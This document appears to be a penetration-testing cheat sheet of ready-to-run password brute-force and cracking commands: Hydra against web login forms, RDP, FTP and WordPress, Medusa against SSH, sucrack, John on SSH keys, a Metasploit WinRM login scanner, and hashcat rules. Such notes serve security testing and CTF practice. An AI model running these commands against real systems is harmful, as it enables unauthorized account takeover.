# Brute-Force

## Hydra

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.45.36 http-post-form "$Link$/login.aspx?ReturnURL=/admin:$COOKIE$:LOGIN FAIL MESSAGE" -vv

sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
```

| Command                                                                                                                                 | Description                                                                                                                                                        |
| --------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| hydra -P wordlist -v ip protocol                                                                                                        | Brute force against a protocol of your choice                                                                                                                      |
| hydra -v -V -u -L username_list -P password_list -t 1 -u ip protocol                                                                    | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) |
| hydra -t 1 -V -f -l username -P wordlist rdp://<ip>                                                                                     | Attack a Windows Remote Desktop with a password list.                                                                                                              |
| hydra -l username -P password list $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra to brute force.                                                                                                            |

```
"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"

Let's break it down:

SECTION             FUNCTION

hydra                   Runs the hydra tool
-t 4                    Number of parallel connections per target
-l [user]               Points to the user who's account you're trying to compromise
-P [path to dictionary] Points to the file containing the list of possible passwords
-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]            The IP address of the target machine
ftp / protocol          Sets the protocol
```

### Basic HTTP auth

```
hydra -l USER -P /usr/share/wordlists/rockyou.txt -s PORT -f 10.10.93.125 http-get /PATH
```

## Brute force ssh with medusa

```
medusa -h IP -U users.txt -P passwords.txt -M ssh IP
```

## Brute force su with sucrack

```
sucrack -a -w 20 -s 10 -u user pass.txt
```

## Brute force ssh key with John

```
/usr/share/john/ssh2john.py id_rsa > for_john.txt

john for_john.txt --wordlist=rockyou.txt
```

## Brute force Windows login

```
msf5 auxiliary(scanner/winrm/winrm_login) > set PASSWORD '$fab@s3Rv1ce$1'
PASSWORD => $fab@s3Rv1ce$1
msf5 auxiliary(scanner/winrm/winrm_login) > set USER_FILE users
USER_FILE => users
msf5 auxiliary(scanner/winrm/winrm_login) > set RHOSTS 10.10.10.193
RHOSTS => 10.10.10.193
msf5 auxiliary(scanner/winrm/winrm_login) > run
```

## Hashcat

Running hashcat with a rule set

```
hashcat -m 3200 hash.txt dict.txt -r /usr/share/hashcat/rules/best64.rule --debug-mode=1 --debug-file=matched.rule --force
```

Create an upgraded wordlist using hashcat rules

```
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout rule > wordlist.txt
```
